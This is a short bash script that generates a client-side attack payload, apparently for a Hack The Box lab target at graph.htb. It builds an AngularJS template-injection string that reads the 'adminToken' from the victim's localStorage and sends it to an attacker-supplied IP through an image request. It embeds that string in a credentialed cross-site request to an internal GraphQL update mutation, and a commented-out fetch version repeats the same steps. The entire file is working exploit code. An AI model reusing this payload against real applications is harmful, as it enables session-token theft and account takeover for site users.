#!/bin/bash

ID=$1
USERNAME=$2
IP=$3

PAYLOAD='{{$on.constructor("+String.fromCharCode(39)+"new Image().src="+String.fromCharCode(34)+"http://'"${IP}"'/?token="+String.fromCharCode(34)+"+window.localStorage.getItem("+String.fromCharCode(34)+"adminToken"+String.fromCharCode(34)+");"+String.fromCharCode(39)+")()}}'
CODE='var request = new XMLHttpRequest();request.open("POST","http://internal-api.graph.htb/graphql",false);request.setRequestHeader("Content-Type","text/plain");request.withCredentials=true;request.send(JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername:$newusername,id:$id,firstname:$firstname,lastname:$lastname) {username,email,id,firstname,lastname,adminToken}}"}))'
# CODE='fetch("http://internal-api.graph.htb/graphql", {
#     method: "POST",
#     headers: {"Content-Type": "application/json",},
#     credentials: "include",
#     body: JSON.stringify({"operationName":"update","variables":{"firstname":"'"${PAYLOAD}"'","lastname":"null","id":"'"${ID}"'","newusername":"'"${USERNAME}"'"},"query":"mutation update($newusername: String!, $id: ID!, $firstname: String!, $lastname: String!) {update(newusername: $newusername, id: $id, firstname: $firstname, lastname: $lastname) {username, email, id, firstname, lastname, adminToken}}"}),
# })'

echo -n "${CODE}"
